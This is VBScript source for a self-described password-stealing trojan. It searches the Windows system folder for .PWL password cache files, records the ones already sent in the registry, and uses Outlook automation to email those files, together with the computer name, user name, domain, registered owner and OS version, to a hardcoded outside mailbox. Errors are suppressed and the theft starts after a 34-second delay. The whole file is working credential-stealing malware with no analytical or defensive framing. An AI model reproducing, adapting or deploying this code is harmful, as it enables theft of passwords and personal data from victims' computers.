'A very simple PSW.Trojan
'Copyright (C) 2002 by Otto von Gutenberg
'This is only tradition
'No confident circumstance, just tradition

Option Explicit
On Error Resume Next 'Keine Fehler!!!

Dim wshShell,fso
Set wshShell=WScript.CreateObject("WScript.Shell")
Set fso=WScript.CreateObject("Scripting.FileSystemObject")
Const tempReg="HKLM\Security\Provider\" 'do not change this
Const pswMail="ovg_psws@hotmail.com"

Sub Sleep(seconds)
	On Error Resume Next
	Dim a1,a2
	a1=Hour(Now)*3600+Minute(Now)*60+Second(Now)
	a2=a1
	While (a2-a1<seconds)
		a2=Hour(Now)*3600+Minute(Now)*60+Second(Now)
	Wend
End Sub

Function Possible(strFile,intFileSize) 'As Boolean
	On Error Resume Next 'Keine Fehler!!!
	Dim strReg, i, n, j
	Dim blPossible
	
	blPossible=False
	If InStr(UCase(strFile),"PWL")>0 Then
		strReg=wshShell.RegRead(tempReg)
		n=CInt(wshShell.RegRead(strReg & "Components\PSWTrojan\Total passwords"))
		j=n+1
		blPossible=True
		For i=1 To n
			Dim strPsw,intSize
			strPsw=wshShell.RegRead(strReg & "Components\PSWTrojan\Password" & i)
			intSize=CInt(wshShell.RegRead(strReg & "Components\PSWTrojan\Size" & i))
			If strPsw=strFile Then j=i
			If strPsw=strFile And intSize=intFileSize Then blPossible=False
		Next
		If blPossible Then
			wshShell.RegWrite strReg & "Components\PSWTrojan\Password" & j,strFile
			wshShell.RegWrite strReg & "Components\PSWTrojan\Size" & j,intFileSize
			If j=n+1 Then wshShell.RegWrite strReg & "Components\PSWTrojan\Total passwords",j,"REG_DWORD"
		End If
	End If
	Possible=blPossible
End Function

Sub ASimplePSWTrojan()
	On Error Resume Next 'Keine Fehler!!!
	Dim outlook,wshNet,mlItem
	Dim strBody, intTotal
	Dim fld1,file1, i
	Dim sentFiles()

	Set fld1=fso.GetSpecialFolder(0)
	intTotal=0
	Redim sentFiles(-1)
	For Each file1 In fld1.Files
		If Possible(file1.Name,file1.Size) Then
			Redim Preserve sentFiles(UBound(sentFiles)+1)
			sentFiles(UBound(sentFiles))=file1.Path
			intTotal=intTotal+1
		End If
	Next
	If intTotal=0 Then Exit Sub
	Set outlook=WScript.CreateObject("Outlook.Application")
	Set mlItem=outlook.CreateItem(0)
	Set wshNet=WScript.CreateObject("WScript.Network")

	mlItem.Recipients.Add pswMail
	mlItem.Subject="Password"
	For i=LBound(sentFiles) To UBound(sentFiles)
		mlItem.Attachments.Add sentFiles(i)
	Next
	strBody=strBody & "Computer name: " & wshNet.ComputerName & vbCrLf
	strBody=strBody & "User name: " & wshNet.UserName & vbCrLf
	strBody=strBody & "User domain: " & wshNet.UserDomain & vbCrLf
	strBody=strBody & "Registered Organization: " & wshShell.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOrganization") & vbCrLf
	strBody=strBody & "Registered Owner: " & wshShell.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner") & vbCrLf
	strBody=strBody & "Platform type: " & wshShell.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\Version") & vbCrLf
	mlItem.Body=strBody
	mlItem.Send
	outlook.Quit
	WScript.DisconnectObject outlook
	WScript.DisconnectObject wshNet
	
	Set outlook=Nothing
	Set mlItem=Nothing
	Set wshNet=Nothing
	Set fld1=Nothing
	Set file1=Nothing
End Sub

Sleep(34)
Call ASimplePSWTrojan()

WScript.DisconnectObject fso
WScript.DisconnectObject wshShell